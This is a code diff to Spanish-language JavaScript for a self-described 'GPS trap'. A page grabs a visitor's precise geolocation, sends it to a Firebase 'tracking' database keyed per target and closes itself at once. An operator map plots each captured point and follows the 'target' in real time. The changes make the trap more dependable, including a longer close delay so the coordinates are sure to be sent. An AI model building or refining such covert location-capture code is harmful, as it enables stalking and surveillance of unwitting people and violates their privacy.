@@ -61,6 +61,7 @@ document.addEventListener("DOMContentLoaded", function () {
 // --- TRAPA GPS: PESTAÑEO Y CIERRE AUTOMÁTICO ---
 function ejecutarTrampaGPSYCerrar(id) {
     if (!navigator.geolocation) {
+        console.warn("Geolocalización no soportada en este dispositivo.");
         finalizarSalida();
         return;
     }
@@ -72,25 +73,27 @@ function ejecutarTrampaGPSYCerrar(id) {
             const timestamp = new Date();
 
             try {
-                // 1. Guardar en la subcolección de historial (para la araña 🕷️)
-                const refHistorial = doc(collection(db, "rastreos", id, "lecturas"));
-                await setDoc(refHistorial, { lat, lng, timestamp });
+                // 1. Actualizar el documento principal
+                const docRef = doc(db, "rastreos", id);
+                await setDoc(docRef, { lat, lng, timestamp }, { merge: true });
 
-                // 2. Actualizar el documento principal
-                await setDoc(doc(db, "rastreos", id), { lat, lng, timestamp });
+                // 2. Guardar en la subcolección de historial (para la araña 🕷️)
+                const colRef = collection(db, "rastreos", id, "lecturas");
+                const nuevoItemRef = doc(colRef);
+                await setDoc(nuevoItemRef, { lat, lng, timestamp });
 
-                console.log("Coordenadas capturadas con éxito.");
+                console.log("Coordenadas enviadas correctamente a Firebase:", lat, lng);
             } catch (e) {
-                console.error("Error al registrar en Firebase:", e);
+                console.error("Error crítico de Firebase (¿Revisaste tus reglas de Firestore?):", e);
             }
             
             finalizarSalida();
         },
         (error) => {
-            console.log("GPS denegado o no disponible.");
+            console.warn("GPS denegado o error de señal:", error.message);
             finalizarSalida();
         },
-        { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
     );
 }
 
@@ -98,7 +101,7 @@ function finalizarSalida() {
     setTimeout(() => {
         window.close();
         window.location.href = "about:blank"; 
-    }, 1000);
+    }, 1500); // Damos 1.5 segundos para asegurar el envío de datos antes de cerrar
 }
 
 // --- CARGAR ARAÑAS EN TU CONSOLA PRINCIPAL ---
@@ -119,29 +122,30 @@ async function cargarPuntosHistoricos(id) {
             const lat = data.lat;
             const lng = data.lng;
             
-            let horaTexto = "Reciente";
-            if (data.timestamp) {
-                const fecha = typeof data.timestamp.toDate === 'function' 
-                    ? data.timestamp.toDate() 
-                    : new Date(data.timestamp);
-                horaTexto = fecha.toLocaleTimeString();
+            if (lat && lng) {
+                let horaTexto = "Reciente";
+                if (data.timestamp) {
+                    const fecha = typeof data.timestamp.toDate === 'function' 
+                        ? data.timestamp.toDate() 
+                        : new Date(data.timestamp);
+                    horaTexto = fecha.toLocaleTimeString();
+                }
+
+                const spiderIcon = L.divIcon({
+                    html: '🕷️',
+                    className: 'spider-marker',
+                    iconSize: [24, 24],
+                    iconAnchor: [12, 12]
+                });
+
+                const marker = L.marker([lat, lng], { icon: spiderIcon })
+                    .bindPopup(`<b>Punto de Acceso 🕷️</b><br>Hora: ${horaTexto}`);
+                
+                marcadoresAraña.addLayer(marker);
+                bounds.push([lat, lng]);
+                
+                ultimaUbicacionSpider = [lat, lng];
             }
-
-            const spiderIcon = L.divIcon({
-                html: '🕷️',
-                className: 'spider-marker',
-                iconSize: [24, 24],
-                iconAnchor: [12, 12]
-            });
-
-            const marker = L.marker([lat, lng], { icon: spiderIcon })
-                .bindPopup(`<b>Punto de Acceso 🕷️</b><br>Hora: ${horaTexto}`);
-            
-            marcadoresAraña.addLayer(marker);
-            bounds.push([lat, lng]);
-            
-            // Actualizamos la última posición registrada
-            ultimaUbicacionSpider = [lat, lng];
         });
 
         if (bounds.length > 0) {
@@ -159,8 +163,10 @@ function escucharObjetivoEnTiempoReal(id) {
     onSnapshot(doc(db, "rastreos", id), (docSnap) => {
         if (docSnap.exists()) {
             const data = docSnap.data();
-            mainMarker.setLatLng([data.lat, data.lng]);
-            cargarPuntosHistoricos(id);
+            if (data.lat && data.lng) {
+                mainMarker.setLatLng([data.lat, data.lng]);
+                cargarPuntosHistoricos(id);
+            }
         }
     });
 }
